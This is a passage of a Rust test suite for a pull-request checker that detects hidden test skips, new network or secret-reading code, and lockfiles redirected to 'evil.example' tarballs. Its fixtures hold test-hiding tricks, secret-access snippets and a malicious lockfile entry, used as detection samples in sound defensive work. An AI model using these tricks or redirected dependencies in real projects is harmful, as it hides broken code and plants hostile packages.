        ("the todo option on it, which runs it but hides its failure", "import { test } from 'node:test';\ntest('adds', { todo: true }, () => {});\n"),
    ] {
        assert!(!tricks_for(&t, &base, &format!("import {{ total }} from '../src/total.js';\n{body}")).is_empty(), "{name} hides a test that existed");
    }
}

#[test]
fn a_conditional_skip_option_is_allowed_but_focusing_never_is() {
    let (t, base) = project();
    let head = "import { test } from 'node:test';\n";
    assert!(tricks_for(&t, &base, &format!("{head}test('adds', {{ skip: process.platform === 'win32' }}, () => {{}});\n")).is_empty(), "a skip on another platform is no trick");
    for body in ["test('adds', { skip: true }, () => {});", "test('adds', { skip: 'not ready' }, () => {});", "const yes = true;\ntest('adds', { only: yes }, () => {});"] {
        assert!(!tricks_for(&t, &base, &format!("{head}{body}\n")).is_empty(), "{body}");
    }
}

#[test]
fn a_skip_moved_into_a_renamed_test_file_still_blocks() {
    let (t, base) = project();
    let head = commit(&t, &[("test/sum.test.js", "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest.skip('adds', () => expect(total([1, 2])).toBe(3));\n")],
        &["test/total.test.js"]);
    let rules = kern::rules::rules(&t.0, &base, &head).unwrap();
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!(r["decision"], "blocked", "deleting a test file and adding a renamed one cannot turn a skipped test into a look: {r}");
}

#[test]
fn an_npm_6_lockfile_is_checked_down_to_its_nested_packages() {
    let lock = |host: &str| json!({ "lockfileVersion": 1, "dependencies": { "a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
        "dependencies": { "b": { "version": "2.0.0", "resolved": format!("https://{host}/b/-/b-2.0.0.tgz") } } } } });
    let out = kern::deps::lock_surprises(&lock("registry.npmjs.org"), &lock("evil.example"));
    assert!(out.iter().any(|w| w.contains("evil.example") && w.contains("b 2.0.0")), "{out:?}");
}

#[test]
fn cloud_and_messaging_sdks_count_as_reaching_the_network() {
    for p in ["package:@aws-sdk/client-s3", "package:@slack/web-api", "package:@octokit/request", "package:openai", "package:stripe", "package:form-data", "package:gaxios"] {
        assert!(kern::rules::risky(p), "{p}");
    }
    for p in ["package:react", "package:lodash", "package:@tanstack/react-query", "package:zod"] { assert!(!kern::rules::risky(p), "{p}"); }
}

#[test]
fn a_global_object_reached_any_way_is_the_global_itself() {
    for (name, source) in [
        ("or", "const g = globalThis || self;\nexport const go = (u) => g.fetch(u);\n"),
        ("nullish", "const g = globalThis ?? window;\nexport const go = (u) => g.fetch(u);\n"),
        ("ternary", "const g = typeof window === 'undefined' ? globalThis : window;\nexport const go = (u) => g.fetch(u);\n"),
        ("comma", "const g = (0, globalThis);\nexport const go = (u) => g.fetch(u);\n"),
        ("reassignment", "let g;\ng = globalThis;\nexport const go = (u) => g.fetch(u);\n"),
        ("arrow", "const g = (() => globalThis)();\nexport const go = (u) => g.fetch(u);\n"),
        ("function", "const g = (function () { return globalThis; })();\nexport const go = (u) => g.fetch(u);\n"),
        ("window.self", "const g = window.self;\nexport const go = (u) => g.fetch(u);\n"),
        ("destructured secret", "const { process: p } = globalThis || self;\nexport const key = () => p.env.SECRET;\n"),
    ] {
        let caps = kern::capability::footprint("src/a.js", source).unwrap();
        assert!(caps.iter().any(|c| c == "global:fetch" || c == "global:process"), "{name}: {caps:?}");
    }
    let caps = kern::capability::footprint("src/a.js", "const w = window;\nexport const width = () => w.innerWidth;\n").unwrap();
    assert!(!caps.iter().any(|c| kern::rules::risky(c)), "reading the window's size is no power: {caps:?}");
}

#[test]
fn a_change_with_no_code_has_no_powers_or_tricks() {
    let (t, base) = project();
    let head = commit(&t, &[("README.md", "# Shop\n")], &[]);
    let r = kern::rules::rules(&t.0, &base, &head).unwrap();
    for k in ["powers", "tricks", "settings", "protected", "dependencies", "lockfile", "agent_notes", "not_checked"] { assert!(r[k].as_array().unwrap().is_empty(), "{k}: {r}"); }
    assert_eq!(r["changed"].as_array().unwrap().len(), 1);
}

use kern::receipt;
use serde_json::{Value, json};

fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
fn clean_rules() -> Value { json!({ "changed": [{ "path": "src/total.js", "operation": "modify" }], "powers": [], "tricks": [], "settings": [], "protected": [], "dependencies": [], "agent_notes": [], "not_checked": [] }) }
fn clean_tests() -> Value { json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 12, "failed": 1, "skipped": 0 }, "after": { "passed": 13, "failed": 1, "skipped": 0 }, "kept": 12, "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": ["t > new"], "already_failing": ["t > needs the internet"], "new_problems": [] }) }
fn kinds(r: &Value, list: &str) -> Vec<String> { r[list].as_array().unwrap().iter().map(|x| x["kind"].as_str().unwrap().to_string()).collect() }

#[test]
fn decision_table() {
    let r = receipt::build(&drive_json(), &clean_rules(), &clean_tests());
    assert_eq!(r["decision"], "clear", "{r}");
    let mut t = clean_tests();
    t["broke"] = json!(["t > rounds to cents"]);
    let r = receipt::build(&drive_json(), &clean_rules(), &t);
    assert_eq!((r["decision"].as_str().unwrap(), kinds(&r, "blocked")), ("blocked", vec!["test-broke".to_string()]), "{r}");
    let mut rules = clean_rules();
    rules["tricks"] = json!([{ "path": "test/a.test.js", "why": "A test file skips, focuses or inverts tests: test/a.test.js uses test.only. Every test must run and check what it says, so remove it" }]);
    assert_eq!(receipt::build(&drive_json(), &rules, &clean_tests())["decision"], "blocked");
    let mut rules = clean_rules();
    rules["powers"] = json!([{ "path": "src/total.js", "added": ["node:child_process"] }]);
    rules["protected"] = json!([{ "path": ".github/workflows/ci.yml", "operation": "modify" }]);
    let mut t = clean_tests();
    t["gone"] = json!(["t > old"]);
    let r = receipt::build(&drive_json(), &rules, &t);
    assert_eq!(r["decision"], "look");
    assert_eq!(kinds(&r, "look"), ["power", "test-gone", "protected"], "powers first, then tests, then the files that steer builds: {r}");
}

#[test]
fn dependency_files_are_one_item_that_names_what_moved() {
    let mut rules = clean_rules();
    rules["dependencies"] = json!([{ "path": "package-lock.json", "operation": "modify" }, { "path": "package.json", "operation": "modify", "packages": ["vitest 3.2.4 → 4.0.18"] }]);
    rules["lockfile"] = json!([{ "path": "package-lock.json", "why": "left-pad resolves to https://evil.example/x.tgz, not its own registry tarball" }]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!((kinds(&r, "look"), kinds(&r, "notes")), (vec!["lockfile".to_string()], vec!["dependencies".to_string()]), "{r}");
    let what = r["notes"][0]["what"].as_str().unwrap();
    assert!(what.contains("vitest 3.2.4 → 4.0.18") && what.contains("package.json") && what.contains("package-lock.json"), "{what}");
    assert!(r["look"][0]["what"].as_str().unwrap().contains("evil.example"), "{r}");
}

#[test]
fn markdown_leads_with_the_answer_and_lists_every_item() {
    let mut t = clean_tests();
    t["broke"] = json!(["t > rounds to cents"]);
    let mut rules = clean_rules();
    rules["dependencies"] = json!([{ "path": "package.json", "operation": "modify" }]);
    let r = receipt::build(&drive_json(), &rules, &t);
    let md = receipt::markdown(&r);
    let first = md.lines().find(|l| !l.trim().is_empty() && !l.starts_with("<!--")).unwrap();
    assert!(first.contains("Blocked") && first.contains("Kern"), "the first line is the answer: {first}");
    for want in ["t > rounds to cents", "**Notes.**", "dependencies change (`package.json`)", "❌ Tests: 1 that passed before now fails; 12 still pass (vitest)", "set aside",
        "**What Kern checked**"] {
        assert!(md.contains(want), "{want}:\n{md}");
    }
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &clean_tests()));
    assert!(md.contains("✅ Tests: 12 that passed before still pass (vitest)") && !md.contains("now fail"), "{md}");
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &json!({ "status": "NOT_RUN", "why": "no test runner Kern can read" })));
    assert!(md.contains("### ⏭️ Kern: Not verified") && md.contains("no test runner Kern can read") && md.contains("Not run"), "a receipt whose tests could not run says it is not verified, and why:\n{md}");
    let none = json!({ "status": "NOT_RUN", "why": "the project has no test script, so no test checks this change", "no_tests": true });
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &none));
    assert!(md.contains("in the rules it checked") && md.contains("no test script"), "a project with no tests gets a receipt that covers the rules only and says so:\n{md}");
    let nothing = json!({ "status": "NOTHING_TO_RUN", "why": "this change touches only documentation" });
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &nothing));
    assert!(md.contains("### ✅ Kern: Nothing unexpected\n") && md.contains("nothing to run") && !md.contains("rules it checked") && !md.contains("Not run"), "{md}");
    assert!(!md.contains("sandbox"), "nothing ran, so the receipt does not speak of a sandbox: {md}");
    let mut t = clean_tests();
    t["runner"] = json!("vitest in packages/kit");
    t["not_run"] = json!([{ "dir": "apps/web", "why": "the tests in apps/web on the new code gave no results: the output contains no jest report (exit 1)" }]);
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &t));
    assert!(md.contains("vitest in packages/kit") && md.contains("apps/web") && md.contains("no jest report (exit 1)"), "{md}");
    let mut t = clean_tests();
    t["broke"] = json!(["a `b` <script>"]);
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &t));
    assert!(!md.contains("<script>"), "{md}");
}

type Seen = std::sync::Arc<std::sync::Mutex<Vec<(String, String, String)>>>;
fn stub_github(route: impl Fn(&str, &str) -> (u16, String) + Send + Sync + 'static) -> (String, Seen) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen: Seen = Default::default();
    let log = seen.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let mut reader = std::io::BufReader::new(s.try_clone().unwrap());
            let mut request = String::new();
            if std::io::BufRead::read_line(&mut reader, &mut request).is_err() { continue; }
            let mut length = 0usize;
            loop {
                let mut line = String::new();
                if std::io::BufRead::read_line(&mut reader, &mut line).unwrap_or(0) == 0 || line == "\r\n" { break; }
                if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") { length = v.trim().parse().unwrap_or(0); }
            }
            let mut body = vec![0u8; length];
            let _ = std::io::Read::read_exact(&mut reader, &mut body);
            let parts: Vec<&str> = request.split_whitespace().collect();
            let (method, path) = (parts.first().copied().unwrap_or("").to_string(), parts.get(1).copied().unwrap_or("").to_string());
            log.lock().unwrap().push((method.clone(), path.clone(), String::from_utf8_lossy(&body).to_string()));
            let (status, reply) = route(&method, &path);
            let _ = std::io::Write::write_all(&mut s, format!("HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{reply}", reply.len()).as_bytes());
        }
    });
    (url, seen)
}
fn receipt_dir(decision_tests: Value) -> Temp {
    let t = Temp::new();
    let r = receipt::build(&drive_json(), &clean_rules(), &decision_tests);
    receipt::write(&t.0, &r).unwrap();
    t
}

#[test]
fn a_receipt_is_posted_once_with_its_status_and_never_over_a_newer_head() {
    let dir = receipt_dir(clean_tests());
    let (url, seen) = stub_github(|m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, "[]".into()),
        ("POST", "/repos/acme/shop/issues/7/comments") => (201, r#"{"id":5,"html_url":"https://github.com/acme/shop/pull/7#c5"}"#.into()),
        ("POST", p) if p.starts_with("/repos/acme/shop/statuses/") => (201, "{}".into()),
        _ => (404, "{}".into()),
    });
    let api = kern::github::Api::new(&url, "t").unwrap();
    let out = receipt::post(&api, &dir.0, "acme/shop", 7).unwrap();
    assert_eq!(out["status"], "POSTED", "{out}");
    let log = seen.lock().unwrap().clone();
    let status = log.iter().find(|(m, p, _)| m == "POST" && p.contains("/statuses/2222222222222222222222222222222222222222")).expect("a status on the head");
    assert!(status.2.contains("\"context\":\"Kern\"") && status.2.contains("\"state\":\"success\""), "{}", status.2);
    let comment = log.iter().find(|(m, p, _)| m == "POST" && p.ends_with("/comments")).unwrap();
    assert!(comment.2.contains("kern-receipt"), "{}", comment.2);
    assert!(!comment.2.contains("Signed by GitHub") && !comment.2.contains("kern-seal"), "a receipt without a seal never claims a signature: {}", comment.2);
    std::fs::write(dir.0.join("seal.json"), json!({ "seal": { "v": 1 }, "token": "a.b.c" }).to_string()).unwrap();
    let (url, seen) = stub_github(|m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, "[]".into()),
        ("POST", _) => (201, r#"{"id":5}"#.into()),
        _ => (404, "{}".into()),
    });
    receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &dir.0, "acme/shop", 7).unwrap();
    let body: Value = serde_json::from_str(&seen.lock().unwrap().iter().find(|(m, p, _)| m == "POST" && p.ends_with("/comments")).unwrap().2).unwrap();
    let body = body["body"].as_str().unwrap();
    assert!(body.contains("Signed by GitHub for Kern's own workflow") && body.contains("kern receipt verify acme/shop 7") && body.trim_end().ends_with("-->"), "{body}");
    let (url, seen) = stub_github(|m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"3333333333333333333333333333333333333333"}}"#.into()),
        _ => (404, "{}".into()),
    });
    let out = receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &dir.0, "acme/shop", 7).unwrap();
    assert_eq!(out["status"], "STALE");
    assert!(!seen.lock().unwrap().iter().any(|(m, _, _)| m == "POST"), "nothing was written");
}

#[test]
fn approval_needs_write_access_a_signed_receipt_and_never_unblocks() {
    let comment_for = |decision: &str| -> String {
        let seal = json!({ "v": 1, "repository": "acme/shop", "pull": 7, "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "decision": decision, "receipt_sha256": "ab" });
        let body = format!("<!-- kern-receipt -->\n### Kern\n{}", receipt::seal_line(&seal, "TOKEN"));
        json!([{ "id": 9, "user": { "login": "github-actions[bot]" }, "body": body }]).to_string()
    };
    let run = |permission: &'static str, decision: &'static str, token_ok: bool| -> (Value, Vec<(String, String, String)>) {
        let comments = comment_for(decision);
        let (url, seen) = stub_github(move |m, p| match (m, p) {
            ("GET", p) if p.starts_with("/repos/acme/shop/collaborators/mallory/permission") => (200, format!(r#"{{"permission":"{permission}"}}"#)),
            ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
            ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, comments.clone()),
            ("POST", _) | ("PATCH", _) => (201, "{}".into()),
            _ => (404, "{}".into()),
        });
        let check = move |_seal: &Value, token: &str| -> R<()> { if token_ok && token == "TOKEN" { Ok(()) } else { Err(Denied("signature".into())) } };
        let r = receipt::approve(&kern::github::Api::new(&url, "t").unwrap(), "acme/shop", 7, "mallory", &check).unwrap();
        let log = seen.lock().unwrap().clone();
        (r, log)
    };
    let success = |log: &[(String, String, String)]| log.iter().any(|(m, p, b)| m == "POST" && p.contains("/statuses/") && b.contains("\"state\":\"success\""));
    let (r, log) = run("read", "look", true);
    assert_eq!(r["status"], "NOT_ALLOWED", "{r}");
    assert!(!success(&log));
    let (r, log) = run("write", "blocked", true);
    assert_eq!(r["status"], "BLOCKED", "{r}");
    assert!(!success(&log), "an approval never clears a block");
    let (r, log) = run("write", "look", false);
    assert_eq!(r["status"], "UNVERIFIED", "a receipt without GitHub's signature for Kern's workflow is not Kern's: {r}");
    assert!(!success(&log));
    let (r, log) = run("maintain", "look", true);
    assert_eq!(r["status"], "APPROVED", "{r}");
    assert!(success(&log), "{log:?}");
}

#[test]
fn a_receipt_kern_could_not_verify_is_never_green_and_a_maintainer_can_accept_it() {
    let dir = receipt_dir(json!({ "status": "NOT_RUN", "why": "the test runner ran but found no tests on either side" }));
    let (url, seen) = stub_github(|m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, "[]".into()),
        ("POST", _) => (201, r#"{"id":5}"#.into()),
        _ => (404, "{}".into()),
    });
    let out = receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &dir.0, "acme/shop", 7).unwrap();
    assert_eq!((out["state"].as_str(), out["decision"].as_str()), (Some("error"), Some("unverified")), "{out}");
    let log = seen.lock().unwrap().clone();
    let status = log.iter().find(|(m, p, _)| m == "POST" && p.contains("/statuses/")).expect("a status on the head");
    assert!(status.2.contains("\"state\":\"error\"") && status.2.contains("Not verified") && !status.2.contains("success"), "{}", status.2);
    let seal = json!({ "v": 1, "repository": "acme/shop", "pull": 7, "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "decision": "unverified", "receipt_sha256": "ab" });
    let comments = json!([{ "id": 9, "user": { "login": "github-actions[bot]" }, "body": format!("<!-- kern-receipt -->\n### Kern\n{}", receipt::seal_line(&seal, "TOKEN")) }]).to_string();
    let (url, seen) = stub_github(move |m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/collaborators/maria/permission") => (200, r#"{"permission":"write"}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, comments.clone()),
        ("POST", _) | ("PATCH", _) => (201, "{}".into()),
        _ => (404, "{}".into()),
    });
    let check = |_seal: &Value, token: &str| -> R<()> { if token == "TOKEN" { Ok(()) } else { Err(Denied("signature".into())) } };
    let r = receipt::approve(&kern::github::Api::new(&url, "t").unwrap(), "acme/shop", 7, "maria", &check).unwrap();
    assert_eq!(r["status"], "APPROVED", "{r}");
    let log = seen.lock().unwrap().clone();
    assert!(log.iter().any(|(m, p, b)| m == "POST" && p.contains("/statuses/") && b.contains("\"state\":\"success\"")), "{log:?}");
    assert!(log.iter().any(|(m, _, b)| m == "PATCH" && b.contains("could not check")), "the approval says what was accepted: {log:?}");
}

fn oidc_keys() -> Value { serde_json::from_str(include_str!("fixtures/oidc/jwks.json")).unwrap() }
fn signed_fixture(name: &str) -> (Value, String) {
    let all: Value = serde_json::from_str(include_str!("fixtures/oidc/tokens.json")).unwrap();
    (all["seals"][name].clone(), all[name].as_str().unwrap().to_string())
}

#[test]
fn only_kern_at_a_branch_or_tag_of_its_own_repository_signs_a_receipt() {
    let keys = oidc_keys();
    let (seal, token) = signed_fixture("full-valid");
    assert_eq!(receipt::signed(&seal, &token, &keys, "acme/shop").unwrap()["run_id"], "123");
    denied(receipt::signed(&seal, &token, &keys, "acme/other"), "repository");
    let mut edited = seal.clone();
    edited["decision"] = json!("clear");
    denied(receipt::signed(&edited, &token, &keys, "acme/shop"), "audience");
    for name in ["full-bare-sha", "full-pull-ref"] {
        let (seal, token) = signed_fixture(name);
        denied(receipt::signed(&seal, &token, &keys, "acme/shop"), "branch or tag");
    }
    let at = |r: &str| json!({ "job_workflow_ref": format!("jastijayakrishna/Kerner/.github/workflows/kern.yml@{r}") });
    for good in ["refs/tags/v0.1.0", "refs/tags/v1.2.3", "refs/heads/main", "refs/heads/one"] { assert!(receipt::kern_workflow(&at(good)).is_ok(), "{good}"); }
    for bad in ["refs/heads/experiment", "refs/heads/old-sign-job", "refs/tags/latest", "refs/tags/v1", "refs/tags/v0.1.0-evil"] {
        denied(receipt::kern_workflow(&at(bad)), "branch or tag");
    }
    denied(receipt::kern_workflow(&json!({})), "branch or tag");
}

fn signed_pull(name: &str, author: &'static str, permission: &'static str) -> (String, Seen) {
    let (seal, token) = signed_fixture(name);
    let body = format!("<!-- kern-receipt -->\n### ⚠️ Kern: 1 thing needs a look\n\n{}\n", receipt::seal_line(&seal, &token));
    let comments = json!([{ "id": 9, "user": { "login": author }, "body": body, "html_url": "https://github.com/acme/shop/pull/7#c9" }]).to_string();
    stub_github(move |m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/collaborators/") => (200, format!(r#"{{"permission":"{permission}"}}"#)),
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, comments.clone()),
        ("POST", _) | ("PATCH", _) => (201, "{}".into()),
        _ => (404, "{}".into()),
    })
}

#[test]
fn approve_checks_github_s_real_signature() {
    let keys = oidc_keys();
    let approve = |name: &str| {
        let (url, seen) = signed_pull(name, "github-actions[bot]", "write");
        let check = |seal: &Value, token: &str| receipt::signed(seal, token, &keys, "acme/shop").map(|_| ());
        let r = receipt::approve(&kern::github::Api::new(&url, "t").unwrap(), "acme/shop", 7, "maria", &check).unwrap();
        let log = seen.lock().unwrap().clone();
        (r, log.iter().any(|(m, p, b)| m == "POST" && p.contains("/statuses/2222222222222222222222222222222222222222") && b.contains("\"state\":\"success\"")))
    };
    let (r, success) = approve("full-valid");
    assert_eq!((r["status"].as_str(), success), (Some("APPROVED"), true), "{r}");
    let (r, success) = approve("full-blocked");
    assert_eq!((r["status"].as_str(), success), (Some("BLOCKED"), false), "{r}");
    for name in ["full-bare-sha", "full-pull-ref"] {
        let (r, success) = approve(name);
        assert_eq!((r["status"].as_str(), success), (Some("UNVERIFIED"), false), "{name}: {r}");
    }
}

#[test]
fn verify_reads_kern_s_receipt_and_checks_its_signature() {
    let keys = oidc_keys();
    let verify = |name: &str, author: &'static str, receipt: Option<&Value>| {
        let (url, _) = signed_pull(name, author, "read");
        receipt::verify(&kern::github::Api::new(&url, "t").unwrap(), "acme/shop", 7, &keys, receipt).unwrap()
    };
    let v = verify("full-valid", "github-actions[bot]", None);
    assert_eq!((v["status"].as_str(), v["decision"].as_str(), v["current"].as_bool(), v["run"].as_str()), (Some("VERIFIED"), Some("look"), Some(true), Some("123")), "{v}");
    assert!(v["workflow"].as_str().unwrap().ends_with("kern.yml@refs/heads/one"), "{v}");
    assert_eq!(verify("full-valid", "github-actions[bot]", Some(&json!({ "decision": "clear" })))["status"], "INVALID");
    assert_eq!(verify("full-bare-sha", "github-actions[bot]", None)["status"], "INVALID");
    assert_eq!(verify("full-valid", "mallory", None)["status"], "NO_RECEIPT");
}

#[test]
fn a_changed_code_file_kern_could_not_read_earns_no_check_mark_for_powers_or_test_tricks() {
    let mut rules = clean_rules();
    rules["changed"] = json!([{ "path": "src/net.js", "operation": "modify" }]);
    rules["not_checked"] = json!([{ "path": "src/net.js", "why": "Changed code cannot be parsed for capability analysis" }]);
    let r = receipt::build(&drive_json(), &rules, &clean_tests());
    assert_eq!(kinds(&r, "unverified"), vec!["not-checked-code"], "{r}");
    let md = receipt::markdown(&r);
    assert!(!md.contains("✅ No new powers"), "Kern never read src/net.js, so it cannot say no power was added:\n{md}");
    assert!(!md.contains("✅ No skipped, focused or removed tests"), "nor that no test trick hides in code it could not read:\n{md}");
}

#[test]
fn a_receipt_whose_probe_input_is_a_decimal_number_still_seals() {
    let mut t = clean_tests();
    t["probes"] = json!({ "status": "RAN", "why": "", "experiments": [{ "id": "e1", "path": "src/price.ts", "export": "formatPrice", "args": [19.99, { "rate": 0.5 }], "why": "a price with cents",
        "obligation": null, "shapes": [["number"]], "host": "src/price.test.ts", "reached": { "old": true, "new": true },
        "answers": { "old": "returns \"19.99\"", "old_again": "returns \"19.99\"", "new": "returns \"19.99\"", "new_again": "returns \"19.99\"" }, "uneven": null }], "not_run": [] });
    let r = receipt::build(&drive_json(), &clean_rules(), &t);
    assert_eq!(r["tests"]["probes"]["experiments"][0]["args"][0], 19.99, "the receipt keeps the input as the AI gave it");
    let md = receipt::markdown(&r);
    let seal = receipt::seal(&r, &md, "acme/shop", 7).unwrap();
    assert_eq!(seal["receipt_sha256"], digest(&r).unwrap());
    assert_eq!(digest(&r).unwrap(), digest(&serde_json::from_str::<Value>(&r.to_string()).unwrap()).unwrap(), "the digest is the same after the receipt is written and read back");
}

#[test]
fn sign_asks_github_for_a_token_over_the_receipt_s_seal() {
    let dir = receipt_dir(clean_tests());
    let (url, seen) = stub_github(|m, p| if m == "GET" && p.starts_with("/token") { (200, r#"{"value":"signed-by-github"}"#.into()) } else { (404, "{}".into()) });
    unsafe {
        std::env::set_var("ACTIONS_ID_TOKEN_REQUEST_URL", format!("{url}/token?api-version=2.0"));
        std::env::set_var("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "bearer-for-this-job");
    }
    assert_eq!(receipt::sign(&dir.0, "acme/shop", 7).unwrap()["status"], "SIGNED");
    let s = read_json(dir.0.join("seal.json")).unwrap();
    let r = read_json(dir.0.join("receipt.json")).unwrap();
    assert_eq!(s["token"], "signed-by-github");
    let md = std::fs::read_to_string(dir.0.join("receipt.md")).unwrap();
    assert_eq!(s["seal"], receipt::seal(&r, &md, "acme/shop", 7).unwrap());
    assert_eq!(s["seal"]["receipt_sha256"], digest(&r).unwrap());
    assert_eq!(s["seal"]["markdown_sha256"], receipt::text_digest(&md), "the seal names the exact text Kern posts");
    let fingerprint = kern::oidc::audience(&s["seal"]).unwrap().trim_start_matches("kern-receipt:").to_string();
    let asked = seen.lock().unwrap()[0].1.clone();
    assert!(asked.starts_with("/token?api-version=2.0&audience=kern-receipt") && asked.ends_with(&fingerprint), "{asked}");
}
